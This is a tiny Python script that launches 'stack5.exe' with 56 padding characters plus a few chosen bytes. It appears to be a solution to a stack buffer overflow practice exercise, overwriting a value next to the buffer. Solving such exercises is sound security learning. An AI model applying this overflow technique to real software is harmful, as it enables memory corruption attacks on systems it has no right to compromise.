import subprocess

args = 'stack5.exe ' + 56 * 'x' + 'XA\\"5'
subprocess.call(args)